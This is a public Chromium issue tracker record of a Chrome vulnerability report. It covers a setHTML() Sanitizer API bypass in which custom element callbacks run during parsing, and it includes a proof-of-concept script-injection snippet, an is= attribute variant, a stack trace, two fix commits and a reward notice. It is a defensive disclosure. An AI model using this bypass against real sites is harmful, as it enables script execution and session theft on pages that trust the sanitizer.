# setHTML() Sanitizer API bypass via custom element callback execution during parsing

| Field | Value |
|-------|-------|
| **Issue ID** | [492963096](https://issues.chromium.org/issues/492963096) |
| **Status** | Accepted |
| **Severity** | S3-Low |
| **Priority** | P2 |
| **Component** | Blink>SecurityFeature>SanitizerAPI |
| **Platforms** | Android, Linux, Mac, Windows, ChromeOS |
| **Reporter** | ch...@gmail.com |
| **Assignee** | vo...@chromium.org |
| **Created** | 2026-03-15 |
| **Bounty** | $2,000.00 |

## Description

---

### Report description

setHTML() Sanitizer API bypass via custom element callback execution during parsing

---

### Bug location

#### Where do you want to report your vulnerability?

Chrome VRP – Report security issues affecting the Chrome browser. [See program rules](https://bughunters.google.com/about/rules/5745167867576320/chrome-vulnerability-reward-program-rules)

#### Which URL (or repository) have you found the vulnerability in?

<https://source.chromium.org/chromium/chromium/src/+/main:third_party/blink/renderer/core/dom/element.cc;l=9200>

---

### The problem

#### Please describe the technical details of the vulnerability

## The problem

### Summary

`Element.setHTML()` in Chrome 146 fires custom element lifecycle callbacks (`attributeChangedCallback`, `connectedCallback`) during HTML fragment parsing, **before** the Sanitizer processes the DOM tree. An attacker who supplies HTML containing custom elements registered on the target page can execute arbitrary JavaScript through these callbacks, while the sanitized output appears completely clean.

Firefox 148 (which also ships `setHTML()`) is **not affected** — it correctly suppresses custom element callbacks during sanitization parsing. Chrome's own `DOMParser` is also not affected.

### Root Cause

In [`element.cc:9200-9211`](https://source.chromium.org/chromium/chromium/src/+/main:third_party/blink/renderer/core/dom/element.cc;l=9200), `CustomElementRegistryForInnerHTML()` returns the live document's `CustomElementRegistry`:

```
CustomElementRegistry* CustomElementRegistryForInnerHTML(Element* element) {
  CustomElementRegistry* registry =
      element->GetDocument().customElementRegistry();
  // ...
  return registry;  // Returns LIVE registry
}

```

This registry is passed to `ParseHTMLFragment()` at [line 9238](https://source.chromium.org/chromium/chromium/src/+/main:third_party/blink/renderer/core/dom/element.cc;l=9238):

```
DocumentFragment* fragment =
    ParseHTMLFragment(html,
                      {/* ... */
                       .registry = CustomElementRegistryForInnerHTML(this)},
                      options, exception_state);

```

The parser creates custom elements using this registry, triggering lifecycle callbacks **synchronously during parsing**. Only after `ParseHTMLFragment` returns does `SanitizerAPI::SanitizeInternal()` ([sanitizer\_api.cc:48](https://source.chromium.org/chromium/chromium/src/+/main:third_party/blink/renderer/core/sanitizer/sanitizer_api.cc;l=48)) run to strip unsafe elements.

The temporal ordering is:

1. **Parse** → custom element created → `attributeChangedCallback(name, old, ATTACKER_VALUE)` fires
2. **Sanitize** → custom element stripped from DOM
3. **Insert** → clean fragment inserted

The callbacks at step 1 have full access to `window`, `document`, and DOM, with attacker-controlled attribute values.

### Reproduction Steps

1. Open Chrome 146+ (stable)
2. Open DevTools Console
3. Paste and run:

```
// Register a custom element (simulates a web component framework)
customElements.define('x-widget', class extends HTMLElement {
  static get observedAttributes() { return ['data-x']; }
  attributeChangedCallback(name, old, val) {
    // This fires DURING setHTML, BEFORE sanitization
    document.title = 'PWNED: ' + val;
    const s = document.createElement('script');
    s.textContent = 'window._proof = "callback executed"';
    document.head.appendChild(s);
  }
});

// Sanitize untrusted HTML with setHTML
const div = document.createElement('div');
document.body.appendChild(div);
div.setHTML('<x-widget data-x="attacker-controlled"></x-widget><p>safe</p>');

// Verify
console.log('Title:', document.title);        // "PWNED: attacker-controlled"
console.log('Script ran:', window._proof);     // "callback executed"
console.log('Output HTML:', div.innerHTML);    // "<p>safe</p>" (clean!)

```

4. Observe: `document.title` changed, script executed, but output HTML is clean.
5. Repeat in Firefox 148 — callbacks do **not** fire.

### Additional Vector: `is=` Attribute

`<div is="x-custom">` survives the **default** sanitizer (since `<div>` is an allowed element). If a customized built-in element is registered, its `connectedCallback` fires:

```
customElements.define('x-div', class extends HTMLDivElement {
  connectedCallback() { document.title = 'PWNED-VIA-IS'; }
}, { extends: 'div' });

div.setHTML('<div is="x-div">innocent</div>');
// Output: <div is="x-div">innocent</div> (element survives!)
// document.title is now "PWNED-VIA-IS"

```
### Verified Capabilities During Callback

| Primitive | Chrome 146 | Firefox 148 |
| --- | --- | --- |
| `attributeChangedCallback` fires | YES | NO |
| Script injection (`document.head.appendChild(script)`) | YES | NO |
| DOM modification (`document.title`, element creation) | YES | NO |
| Cookie access (`document.cookie`) | YES | NO |
| Network requests (`fetch()`) | YES | NO |
| Output HTML appears clean | YES | YES |

#### Impact analysis

### Who Can Exploit

Any web attacker who can supply HTML content to a `setHTML()` call on a target page. This is the **intended use case** of the Sanitizer API — `setHTML()` was designed specifically to safely handle untrusted HTML input (e.g., user-generated content, rich text editors, HTML email rendering).

### Preconditions

1. Target page registers custom elements with `observedAttributes` — this is **standard practice** in modern web apps using component frameworks (Lit, Stencil, FAST, Angular Elements, Shoelace, Microsoft FAST, etc.)
2. Target page uses `setHTML()` to sanitize user-provided HTML
3. Attacker discovers registered custom element names (visible in page source)

### What the Attacker Gains

- **Equivalent to XSS**: Full JavaScript execution in the page's origin context
- **Cookie/session theft**: `document.cookie` is accessible from the callback
- **DOM manipulation**: Arbitrary DOM modification including script injection
- **Network access**: `fetch()` and `XMLHttpRequest` are callable
- **Invisibility**: The sanitized output HTML is completely clean — the attack leaves no trace in the DOM

### Severity Justification

This violates the **fundamental security invariant** of the Sanitizer API: that `setHTML()` produces safe output without executing attacker-controlled code. Developers using `setHTML()` as a security boundary against XSS are vulnerable despite following the API's intended usage. Firefox 148 and Chrome's own `DOMParser` correctly prevent this, confirming it is a Chrome implementation bug.

---

### The cause

#### What version of Chrome have you found the security issue in?

146.0.7680.72 stable

#### Is the security issue related to a crash?

No, it is not related to a crash.

#### Choose the type of vulnerability

Security UI Spoofing

#### How would you like to be publicly acknowledged for your report?

s3zer0

## Attachments

- [poc_custom_element_bypass.html](attachments/poc_custom_element_bypass.html) (text/html, 8.6 KB)
- [sethtml_ce_bypass.html](attachments/sethtml_ce_bypass.html) (text/html, 1.5 KB)

## Timeline

### dr...@chromium.org (2026-03-16)

This does reproduce in M146. Given the Sanitizer API defaults to removing custom elements, this probably shouldn't happen. vogelheim@ - what do you think?

### vo...@google.com (2026-03-16)

nrosenthal@: fyi, b/c of the 'parser executes callback during parsing' angle.

### vo...@chromium.org (2026-03-16)

This repros, and should indeed be a security vulnerability.

Severity is tricky, however: An attacker can't really define their own custom elements. If it could, that is, if the attacker can already execute script, then this attack wouldn't really add anything. So this requires a page that already defines custom elements, where the element handler already does something sufficiently interesting that can be exploited. So that's still a security issue, but one that can't be applied to arbitrary pages.



### vo...@chromium.org (2026-03-16)

Stack trace:

Frames #0..#9 are from the CHECK. farme #10 downwards are the interesting bits.

```
#0 0x7f814f6fb499 base::debug::CollectStackTrace() [../../base/debug/stack_trace_posix.cc:1048:7]
#1 0x7f814f6a504a base::debug::StackTrace::StackTrace() [../../base/debug/stack_trace.cc:280:20]
#2 0x7f814f6a4fb5 base::debug::StackTrace::StackTrace() [../../base/debug/stack_trace.cc:275:28]
#3 0x7f814f364d11 logging::LogMessage::Flush() [../../base/logging.cc:708:29]
#4 0x7f814f364c47 logging::LogMessage::~LogMessage() [../../base/logging.cc:697:3]
#5 0x7f814f3150cc logging::(anonymous namespace)::CheckLogMessage::~CheckLogMessage() [../../base/check.cc:198:3]
#6 0x7f814f3150f9 logging::(anonymous namespace)::CheckLogMessage::~CheckLogMessage() [../../base/check.cc:195:31]
#7 0x7f814f315ca8 std::__Cr::default_delete<>::operator()() [gen/third_party/libc++/src/include/__memory/unique_ptr.h:74:5]
#8 0x7f814f31575a std::__Cr::unique_ptr<>::reset() [gen/third_party/libc++/src/include/__memory/unique_ptr.h:288:7]
#9 0x7f814f314b59 logging::CheckNoreturnError::~CheckNoreturnError() [../../base/check.cc:363:16]
#10 0x7f80f2509122 blink::CustomElementDefinition::EnqueueAttributeChangedCallback() [../../third_party/blink/renderer/core/html/custom/custom_element_definition.cc:300:1]
#11 0x7f80f2508f51 blink::CustomElementDefinition::EnqueueAttributeChangedCallbackForAllAttributes() [../../third_party/blink/renderer/core/html/custom/custom_element_definition.cc:315:7]
#12 0x7f80f2508b77 blink::CustomElementDefinition::Upgrade() [../../third_party/blink/renderer/core/html/custom/custom_element_definition.cc:218:5]
#13 0x7f80f250a429 blink::CustomElementUpgradeReaction::Invoke() [../../third_party/blink/renderer/core/html/custom/custom_element_reaction_factory.cc:29:20]
#14 0x7f80f250feac blink::CustomElementReactionQueue::InvokeReactions() [../../third_party/blink/renderer/core/html/custom/custom_element_reaction_queue.cc:33:15]
#15 0x7f80f251579d blink::CustomElementReactionStack::InvokeReactions() [../../third_party/blink/renderer/core/html/custom/custom_element_reaction_stack.cc:56:16]
#16 0x7f80f2515041 blink::CustomElementReactionStack::PopInvokingReactions() [../../third_party/blink/renderer/core/html/custom/custom_element_reaction_stack.cc:45:5]
#17 0x7f80f24f3566 blink::CEReactionsScope::~CEReactionsScope() [../../third_party/blink/renderer/core/html/custom/ce_reactions_scope.cc:34:13]
#18 0x7f80f596b787 blink::(anonymous namespace)::v8_element::SetHTMLOperationOverload1() [gen/third_party/blink/renderer/bindings/core/v8/v8_element.cc:5406:1]
#19 0x7f80f59606af blink::(anonymous namespace)::v8_element::SetHTMLOperationCallback() [gen/third_party/blink/renderer/bindings/core/v8/v8_element.cc:5479:10]
#20 0x7f80e0978ab0 Builtins_CallApiCallbackGeneric
Task trace:
#0 0x7f80f5147654 blink::HTMLDocumentParser::SchedulePumpTokenizer() [../../third_party/blink/renderer/core/html/parser/html_document_parser.cc:863:7]
#1 0x7f81409e6270 IPC::ChannelAssociatedGroupController::Accept() [../../ipc/ipc_mojo_bootstrap.cc:1138:13]
```

### vo...@chromium.org (2026-03-16)

Offline comment, from Noam:

> we are passing the custom element registry as a parameter to the fragment parser
> 
> we should not pass it on when using the inert document, and instead rely on the CEs being adopted when the fragment is inserted

### vo...@chromium.org (2026-03-16)

Preliminary fix in [crrev.com/c/7671377](https://crrev.com/c/7671377)

### ch...@google.com (2026-03-17)

Setting milestone because of s2 severity.

### ch...@google.com (2026-03-17)

Setting Priority to P2 to match Severity s2. To ensure SLOs are tracked correctly, priority must match or exceed severity.

### vo...@google.com (2026-03-17)

The added tests highlight an unfortunate interaction between Sanitizer API and Scoped Custom Element Registries. This might be a spec issue, and is tracked here: <https://github.com/WICG/sanitizer-api/issues/381>

The current fix is that for inert documents, i.e. `CreateFragmentForInnerOuterHTML` called with `ForceInertTemplate::kForce`, we will ignore the passed-in custom element registry. (Regardless of whether the global registry or scoped.) For the global registry, that is just fine, because when the generated DOM tree is later adopted by its final host node, the custom element processing happens then. But for Scoped Custom Element Registries it doesn't, and that is apparently per spec.

### dx...@google.com (2026-03-19)

Project: chromium/src  

Branch:  main  

Author:  Daniel Vogelheim [vogelheim@chromium.org](mailto:vogelheim@chromium.org)  

Link:    <https://chromium-review.googlesource.com/7671377>

Parsing into an inert template shouldn't run custom element callbacks.

---


Expand for full commit details
```
     
    Custom elements may fire callbacks during parsing. The intent of an inert template document (via ForceInertTemplate::kForce) is to parse 
    into a template that doesn't have behaviours. To make sure this also 
    applies to custom element callbacks, we shouldn't pass the custom 
    element registry to the parser when an inert template was requested. 
     
    At some point, the template contents will be inserted into the document. 
    Then, the callbacks (for that document's custom element registry) will 
    be run. 
     
    Fixed: 492963096 
    Change-Id: If9872a987296e730f70a05038f66e53b58d09039 
    Reviewed-on: https://chromium-review.googlesource.com/c/chromium/src/+/7671377 
    Reviewed-by: Joey Arhar <jarhar@chromium.org> 
    Reviewed-by: Noam Rosenthal <nrosenthal@google.com> 
    Commit-Queue: Daniel Vogelheim <vogelheim@chromium.org> 
    Cr-Commit-Position: refs/heads/main@{#1601886}

```

---

Files:

- M `third_party/blink/renderer/core/editing/serializers/serialization.cc`
- A `third_party/blink/web_tests/external/wpt/sanitizer-api/sethtml-with-custom-elements.tentative-expected.txt`
- A `third_party/blink/web_tests/external/wpt/sanitizer-api/sethtml-with-custom-elements.tentative.html`

---

Hash: [f49ef5bce6be323b991d5a52cb6c2eaba55bdf3f](https://chromiumdash.appspot.com/commit/f49ef5bce6be323b991d5a52cb6c2eaba55bdf3f)  

Date: Thu Mar 19 11:41:10 2026


---

### ch...@gmail.com (2026-04-30)

Hi team — this report has had the reward-topanel hotlist applied, and the last modification was on March 19. It's now been over six weeks without a panel decision. Could someone please check whether this is blocked on something or if any additional info is needed from my side? Happy to provide anything that would help move it forward. Thanks!

### dx...@google.com (2026-06-01)

Project: chromium/src  

Branch:  main  

Author:  Daniel Vogelheim [vogelheim@chromium.org](mailto:vogelheim@chromium.org)  

Link:    <https://chromium-review.googlesource.com/7883146>

[Sanitizer] Remove custom element state, when created by is=

---


Expand for full commit details
```
     
    The HTML parse will process the is= attribute and put the element into 
    custom element state. When later on the is= attribute is removed by the 
    Sanitizer, the element is still upgraded because it's been marked as 
    a custom element. 
     
    This change prevents the is=-related custom element to be processed, 
    when the streaming Sanitizer will remove it. 
     
    Bug: 492963096, 513844247, 517171036 
    Change-Id: I7b10f55b6dd9d568336c731ee8a8c2a52254371f 
    Reviewed-on: https://chromium-review.googlesource.com/c/chromium/src/+/7883146 
    Reviewed-by: Noam Rosenthal <nrosenthal@google.com> 
    Commit-Queue: Daniel Vogelheim <vogelheim@chromium.org> 
    Cr-Commit-Position: refs/heads/main@{#1639435}

```

---

Files:

- M `third_party/blink/renderer/core/html/parser/html_construction_site.cc`
- M `third_party/blink/renderer/core/sanitizer/sanitizer.cc`
- M `third_party/blink/renderer/core/sanitizer/sanitizer.h`
- D `third_party/blink/web_tests/external/wpt/sanitizer-api/sanitizer-custom-elements-is.tentative-expected.txt`
- D `third_party/blink/web_tests/external/wpt/sanitizer-api/sethtml-with-custom-elements-expected.txt`
- M `third_party/blink/web_tests/external/wpt/sanitizer-api/sethtml-with-custom-elements.html`

---

Hash: [eeaa42aa25b1066049bc10ec09fa3ff4b91b6f2b](https://chromiumdash.appspot.com/commit/eeaa42aa25b1066049bc10ec09fa3ff4b91b6f2b)  

Date: Mon Jun 1 15:57:09 2026


---

### ch...@google.com (2026-06-26)

This bug has been closed for more than 14 weeks. Removing issue access restrictions.

### sp...@google.com (2026-06-29)

** NOTE: This is an automatically generated email **

Hello,

Congratulations! The Chrome Vulnerability Rewards Program (VRP) Panel has decided to award you $2000.00 for this report.

Rationale for this decision:
Exploit mitigation bypass.


Important: This payment will be issued by Bugcrowd. You will receive an email from Bugcrowd in the next 24 hours which contains a submission you must claim to be rewarded.

If you do not receive an email from them, please check your spam folder and then reach out to us via a comment here. For issues related to Bugcrowd itself, please contact them via https://bugcrowd.com/support.


Thank you for your efforts and helping us make Chrome more secure for all users!

Cheers,
Chrome VRP Panel Bot


P.S. One other thing we'd like to mention:

* Please do NOT publicly disclose details until a fix has been released to all our users. Early public disclosure may cancel the provisional reward. Also, please be considerate about disclosure when the bug affects a core library that may be used by other products. Please do NOT share this information with third parties who are not directly involved in fixing the bug. Doing so may cancel the provisional reward. Please be honest if you have already disclosed anything publicly or to third parties. Lastly, we understand that some of you are not interested in money. We offer the option to donate your reward to an eligible charity. Any rewards that are unclaimed after 12 months will be donated to a charity of our choosing.

Please contact security-vrp@chromium.org with any questions.

---
*Data from [Chromium Issue Tracker](https://issues.chromium.org/issues/492963096)*
